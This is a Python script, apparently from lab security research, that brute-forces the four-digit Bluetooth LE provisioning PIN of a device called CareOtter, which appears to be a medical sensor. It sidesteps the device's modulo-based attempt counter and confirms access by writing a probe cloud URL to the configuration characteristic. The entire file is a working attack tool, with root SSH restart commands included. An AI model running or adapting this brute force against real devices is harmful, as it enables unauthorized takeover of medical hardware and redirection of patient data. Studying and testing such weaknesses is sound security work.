#!/usr/bin/env python3
"""CareOtter PIN brute force via bleak — self-contained.

Iterates 0000..9999 writing each candidate to the Provisioning Auth char
(0xFF12) and detects the correct PIN entirely client-side, without any
SSH side-channel to the device log.

The BLE peripheral does NOT expose `_provisioning_state["authenticated"]`
directly:
    ProvisioningAuthChrc.ReadValue → only returns
        {"attempts_remaining": max(0, 3 - (pin_attempts % 3)),
         "locked": false}
The `% 3` cycle hides the real attempt count and produces a value of 3
both on success (pin_attempts reset to 0) and on every third failure
(wrap from 2 → 3). A counter-only detector therefore has a ~33 % false
positive rate.

Strategy used here:
  1. After each PIN write, read 0xFF12. If attempts_remaining != 3 we
     definitely failed — skip the probe (cheap path, taken ~2/3 of the
     time).
  2. If attempts_remaining == 3 we *might* have succeeded — issue a
     `cloud_set` probe on 0xFF11 with a unique sentinel URL, then read
     0xFF11 back. ProvisioningConfigChrc.WriteValue is gated on
     `authenticated`: if the probe URL appears in the read-back, we are
     genuinely authenticated; otherwise it was just a modulo wrap.
  3. On confirmed success, the original cloud_url is restored before
     exiting so the device is left in its pre-brute state (except for the
     transient async POST to the probe URL, which the cloud_set side path
     will fire and fail because the URL is unreachable).

Empirical run on the lab: PIN 6767 reached in attempt #6768.
"""
import asyncio
import json
import sys
import time
import uuid

from bleak import BleakClient, BleakScanner

TARGET    = "43:45:C0:00:1F:AC"
AUTH_UUID = "0000ff12-0000-1000-8000-00805f9b34fb"
CFG_UUID  = "0000ff11-0000-1000-8000-00805f9b34fb"
SCAN_TIMEOUT = 15.0


def _resolve(client, uuid_str):
    """Resolve a characteristic by exact object — avoids 'multiple chars
    with this UUID' if stale ble_server.py instances are still registered
    in BlueZ."""
    for svc in client.services:
        for ch in svc.characteristics:
            if ch.uuid == uuid_str:
                return ch
    return None


async def _probe_is_authenticated(client, cfg_chr) -> tuple[bool, str]:
    """Returns (authenticated, original_cloud_url).

    Writes a unique cloud_set sentinel and reads back. If the sentinel is
    visible in 0xFF11's JSON, the write was accepted ⇒ authenticated.
    """
    sentinel = f"http://_brute_probe_{uuid.uuid4().hex[:8]}_:0"
    # Snapshot the pre-probe state so we can restore it on success
    raw_before = await client.read_gatt_char(cfg_chr)
    before = json.loads(raw_before.decode())
    original_url = before.get("cloud_url", "")
    # Issue the probe
    payload = json.dumps({"cmd": "cloud_set", "url": sentinel}).encode()
    await client.write_gatt_char(cfg_chr, payload, response=True)
    # Read back
    raw_after = await client.read_gatt_char(cfg_chr)
    after = json.loads(raw_after.decode())
    return after.get("cloud_url", "") == sentinel, original_url


async def _restore_cloud_url(client, cfg_chr, original_url: str):
    """Best-effort restore after a successful probe."""
    payload = json.dumps({"cmd": "cloud_set", "url": original_url}).encode()
    try:
        await client.write_gatt_char(cfg_chr, payload, response=True)
    except Exception as exc:
        print(f"[!] could not restore cloud_url: {exc}")


async def brute():
    # BleakClient(<MAC>) does not perform discovery; it relies on the
    # bluetoothd device cache. After a daemon restart or if the Cypress
    # controller dropped the cached entry, the connection raises
    # BleakDeviceNotFoundError. An active scan rebuilds the cache and
    # also returns the BLEDevice handle that BleakClient prefers.
    print(f"[*] Scanning for {TARGET} ({SCAN_TIMEOUT}s) ...")
    device = await BleakScanner.find_device_by_address(TARGET, timeout=SCAN_TIMEOUT)
    if device is None:
        print(f"[-] {TARGET} not found in advertising — is ble_server.py up "
              f"and another BLE central not holding the connection?")
        return None
    print(f"[+] Found {device.name} @ {device.address}  RSSI={getattr(device, 'rssi', '?')}")

    async with BleakClient(device, timeout=20.0) as c:
        auth_chr = _resolve(c, AUTH_UUID)
        cfg_chr  = _resolve(c, CFG_UUID)
        if auth_chr is None or cfg_chr is None:
            print("[-] required characteristics not found")
            return None
        print(f"[+] Connected. auth=handle:{auth_chr.handle}  "
              f"cfg=handle:{cfg_chr.handle}")

        # ── Pre-flight check ────────────────────────────────────────────────
        # _provisioning_state["authenticated"] is a process-global flag in
        # ble_server.py that PERSISTS across BLE disconnects until the
        # daemon restarts. A previous successful brute-force run (or any
        # past PIN write) leaves the server in authenticated=True, in
        # which case the cloud_set probe would succeed on the very first
        # candidate PIN and yield a meaningless "PIN FOUND".
        #
        # Detect this and bail out with a clear remediation message.
        print("[*] Pre-flight: probing current auth state...")
        already_authed, original_url = await _probe_is_authenticated(c, cfg_chr)
        if already_authed:
            print("[!] Server is ALREADY in authenticated=True state.")
            print("[!] This is residual from a previous run — _provisioning_state")
            print("[!] persists in memory while ble_server.py is alive. The")
            print("[!] brute force cannot run from a clean baseline.")
            print("[!] Reset on the device with:")
            print("[!]   ssh root@192.168.2.1 'kill -9 $(pgrep -f ble_server.py)'")
            print("[!]   ssh root@192.168.2.1 '( setsid /usr/bin/python3 -u "
                  "/opt/medical-sensor/ble_server.py "
                  ">>/tmp/ble_server.log 2>&1 </dev/null & )'")
            await _restore_cloud_url(c, cfg_chr, original_url)
            return None
        print("[+] Pre-flight OK: server is unauthenticated, brute force will run.")

        start = time.perf_counter()
        for n in range(10_000):
            pin = f"{n:04d}"

            # 1) Write candidate PIN
            try:
                await c.write_gatt_char(auth_chr, pin.encode(), response=True)
            except Exception as e:
                print(f"[-] write failed at {pin}: {e}")
                await asyncio.sleep(0.1)
                continue

            # 2) Cheap pre-filter: read attempts_remaining. Any value != 3
            #    is a guaranteed failure (no modulo collision possible).
            try:
                raw = await c.read_gatt_char(auth_chr)
                remaining = json.loads(raw.decode()).get("attempts_remaining")
            except Exception as e:
                print(f"[-] read failed at {pin}: {e}")
                continue

            if remaining != 3:
                if n % 200 == 0 and n > 0:
                    elapsed = time.perf_counter() - start
                    rate = (n + 1) / elapsed
                    eta = (10_000 - n) / rate
                    print(f"[*] {pin}  rate={rate:.1f}/s  eta={eta:.0f}s")
                continue

            # 3) attempts_remaining == 3 → either success or modulo wrap.
            #    Disambiguate via the cloud_set side-effect probe.
            authed, original_url = await _probe_is_authenticated(c, cfg_chr)
            if authed:
                elapsed = time.perf_counter() - start
                print(f"\n[+] PIN FOUND: {pin}")
                print(f"[+] attempt #{n + 1} of 10 000")
                print(f"[+] elapsed: {elapsed:.1f}s "
                      f"({(n + 1) / elapsed:.1f} writes/s)")
                # Tidy up: put cloud_url back so the device is left clean
                await _restore_cloud_url(c, cfg_chr, original_url)
                print(f"[+] cloud_url restored to {original_url!r}")
                return pin

            # Was a modulo wrap, keep going
            if n % 200 == 0 and n > 0:
                elapsed = time.perf_counter() - start
                rate = (n + 1) / elapsed
                eta = (10_000 - n) / rate
                print(f"[*] {pin}  wrap@%3  rate={rate:.1f}/s  eta={eta:.0f}s")

        print("[-] Exhausted 10 000 PINs without success")
        return None


if __name__ == "__main__":
    try:
        result = asyncio.run(brute())
        sys.exit(0 if result else 1)
    except KeyboardInterrupt:
        print("\n[!] aborted")
        sys.exit(130)
